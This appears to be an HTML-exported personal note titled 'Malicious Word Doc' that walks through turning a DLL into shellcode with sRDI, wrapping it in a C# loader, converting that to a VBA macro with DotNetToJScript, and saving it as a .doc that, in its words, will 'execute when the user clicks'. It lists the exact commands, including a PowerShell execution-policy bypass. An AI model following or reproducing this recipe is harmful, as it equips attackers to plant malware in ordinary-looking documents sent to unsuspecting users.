<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Malicious Word Doc</title>
</head><body><img height="159" src="image.png" width="500"/><br/>
<br/>
<span style="font-size: 14pt"><b>Shellcode Reflective DLL Injection<br/>
<br/>
</b></span>Repo ref: https://github.com/monoxgas/sRDI (sRDI - Shellcode Reflective DLL Injection)<br/>
<br/>
<b>Prerequisties:</b><ul><li style="list-style-type: none">Convert-To-Shellcode.ps1</li>
<li style="list-style-type: none">DotNetToJScript.exe</li>
<li style="list-style-type: none">Malicious.dll</li>
<li style="list-style-type: none">loader.cs</li>
<li style="list-style-type: none"/>
</ul>
<br/>
<b>Reminder for final product: export as .doc</b><br/>
<br/>
---------------------------------------------------------------------<br/>
Begin:<br/>
<br/>
We need to dump the dll file in order to see the exported functions<ul><li style="list-style-type: none">We want to pick the specific exported function</li>
</ul>
&gt; dumpbin /exports malicious.dll<br/>
<br/>
<img height="333" src="image 2.png" width="350"/><br/>
<br/>
In a hello-wrold dll the example exported function is <b>MessageBoxThread</b><br/>
<br/>
Picking the function we want to execute<br/>
&gt; rundll32 malicious.dll, <b>MessageboxThread<br/>
</b><b><br/>
</b><b>Start powershell session</b><br/>
&gt; powershell.exe -ExecutionPolicy Bypass<br/>
<br/>
<b>Load our shellcode ps1 script<br/>
</b>&gt; . &quot;.\ConvertTo-Shellcode.ps1&quot;<br/>
<br/>
<b>Setting environmental variable &quot;$shellcode&quot; and exporting to CLIPBOARD</b><br/>
&gt; $shellcode = ConvertTo-Shellcodemalicious.dll<br/>
&gt; $shellcode -join &quot;,&quot; | clip<br/>
<br/>
<b>just save it into a textfile<br/>
</b>now you should have shellcode.txt<br/>
<br/>
<br/>
<br/>
<b>From this point you need to build a C# loader</b><ul><li style="list-style-type: none">Shellcode goes here in program</li>
<li style="list-style-type: none"><img src="image 3.png"/></li>
</ul>
<br/>
<br/>
<br/>
<b>Once you shellcode has been input, building should leave you with 22 similar files...</b><br/>
<img src="image 4.png"/><br/>
<br/>
----------------------------------------------------------------------------<br/>
<span style="font-size: 14pt"><b>DotNetToJScript</b></span><br/>
https://github.com/tyranid/DotNetToJScript<br/>
<br/>
Using the DotNet exe to create your VBA file and export to clipboard<br/>
<br/>
CMD &gt; .\DotNetToJScript.exe ..\Loader\bun\release\Loader.dll -c Loader.Loader -l VBA | clip<br/>
<br/>
<br/>
<br/>
<br/>
-------------------------------------------------------------<br/>
<span style="font-size: 14pt">Opening a new document</span><ul><span style="font-size: 14pt"><li style="list-style-type: none">open visual basic editor (alt+f11)</li>
</span></ul>
<img height="335" src="image 5.png" width="600"/><br/>
<br/>
<b>Once it is open do:</b><br/>
<img height="292" src="image 6.png" width="550"/>     --&gt;   ex: <img height="181" src="image 7.png" width="400"/><br/>
<br/>
<br/>
<b><span style="font-size: 16pt">EXPORT AS .doc</span></b><br/>
<br/>
<br/>
<br/>
Now it will execute when the user clicks<br/>
<img src="image 8.png"/><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<ul><li style="list-style-type: none"/>
</ul>
</body></html>